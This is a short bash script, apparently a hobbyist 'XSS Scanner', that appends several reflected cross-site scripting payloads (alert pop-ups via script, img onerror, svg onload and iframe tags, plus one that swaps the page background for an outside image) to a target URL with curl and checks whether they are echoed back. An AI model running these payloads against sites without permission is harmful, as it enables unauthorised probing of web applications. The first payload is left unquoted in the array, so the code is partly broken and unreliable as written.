#!/bin/bash
# XSS Scanner v2
# Author: d4nu-ghost

if [ $# -ne 1 ]; then
    echo "Usage: $0 <url>"
    echo "Example: $0 'http://target.com/index.php?q=test'"
    exit 1
fi

url=$1

# Payload list
payloads=(
    <script>document.body.background="https://image2url.com/images/1756982166394-31e12d70-89af-4f6a-b354-cdb983d619b2.jpg"; </script>
    "'\"><script>alert(d4nughost)</script>"
    "\"><img src=x onerror=alert(d4nughost)>"
    "<svg onload=alert(d4nughost)>"
    "<iframe src=javascript:alert(d4nughost)>"
    "d4nu ghost xss"
)

echo "🚀 Mulai scanning XSS di: $url"
echo "==================================="

for payload in "${payloads[@]}"; do
    echo "[*] Testing payload: $payload"
    response=$(curl -s -L "$url$payload")

    if echo "$response" | grep -q "$payload"; then
        echo "✅ Refleksi ditemukan! --> POTENSI XSS 🎯"
    else
        echo "❌ Tidak refleksi"
    fi
    echo "-----------------------------------"
done

echo "🔍 Selesai scanning."
